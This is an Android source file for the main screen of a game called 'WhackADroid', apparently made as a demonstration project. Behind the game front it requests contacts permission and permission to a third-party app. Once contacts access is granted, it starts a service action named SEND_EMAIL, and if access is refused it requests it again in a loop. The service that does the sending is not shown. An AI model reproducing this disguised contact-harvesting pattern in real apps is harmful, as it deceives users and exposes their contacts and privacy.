package com.tum.whackadroid.Activity;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.tum.whackadroid.Service.GameService;
import com.tum.whackadroid.R;


public class MainActivity extends AppCompatActivity{

    public static final String WHACK_A_DROID = "WhackADroid";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Start the gaming service
        TextView message = (TextView) findViewById(R.id.TextView_Main_Message);
        message.setText("Loading...");
        startUIActivity(GameService.GAIN_ACCESS);
        requestPermissions();
    }

    @Override
    protected void onDestroy(){
        super.onDestroy();
        // Stop/Pause the service
        TextView message = (TextView) findViewById(R.id.TextView_Main_Message);
        message.setText("Exiting...");
        Intent gameIntent = new Intent(this, GameService.class);
        gameIntent.setAction(GameService.STOP_GAME);
        stopService(gameIntent);
    }

    public void test(){
        Button x = (Button) findViewById(R.id.button);
        x.setText("Clicked");
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(MainActivity.this,  new String[]{ Manifest.permission.READ_CONTACTS , "com.catchnotes.permission.ACTIVITY" }, 1);
    }

    private void startUIActivity(final String mode) {
        Intent gameIntent = new Intent(this, GameService.class);
        gameIntent.setAction(mode);
        startService(gameIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 1: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Got contact permissions
                    Log.d(WHACK_A_DROID, "Got contact permissions!");
                    Intent emailIntent = new Intent(this, GameService.class);
                    emailIntent.setAction(GameService.SEND_EMAIL);
                    startService(emailIntent);
                } else {
                    Log.d(WHACK_A_DROID, "Contact permissions denied!");
                    Toast.makeText(MainActivity.this, "Permission denied to read your contacts", Toast.LENGTH_SHORT).show();
                    startUIActivity(GameService.GAIN_ACCESS);
                    requestPermissions();
                }
                return;
            }
        }
    }

}
